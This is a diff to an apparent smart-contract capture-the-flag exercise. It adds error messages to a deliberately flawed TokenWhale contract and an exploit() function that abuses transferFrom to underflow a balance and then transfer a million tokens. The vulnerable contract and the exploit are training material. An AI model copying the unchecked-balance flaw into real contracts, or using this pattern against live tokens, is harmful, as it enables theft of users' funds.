@@ -25,11 +25,15 @@ contract TokenWhale {
     }
 
     function _transfer(address to, uint256 value) internal {
+       
+
         unchecked {
             balanceOf[msg.sender] -= value;
             balanceOf[to] += value;
         }
 
+         
+        
         emit Transfer(msg.sender, to, value);
     }
 
@@ -52,9 +56,10 @@ contract TokenWhale {
     }
 
     function transferFrom(address from, address to, uint256 value) public {
-        require(balanceOf[from] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-        require(allowance[from][msg.sender] >= value);
+  
+        require(balanceOf[from] >= value, "Not enough balance");
+        require(balanceOf[to] + value >= balanceOf[to], "Overflow");
+        require(allowance[from][msg.sender] >= value, "Not enough allowance");
 
         allowance[from][msg.sender] -= value;
         _transfer(to, value);
@@ -67,6 +72,15 @@ contract ExploitContract {
 
     constructor(TokenWhale _tokenWhale) {
         tokenWhale = _tokenWhale;
+    }
+
+     function exploit() public {
+
+        // Exploit the transferFrom function
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1);
+
+        tokenWhale.transfer(msg.sender, 1000000);
+
     }
 
     // write your exploit functions below
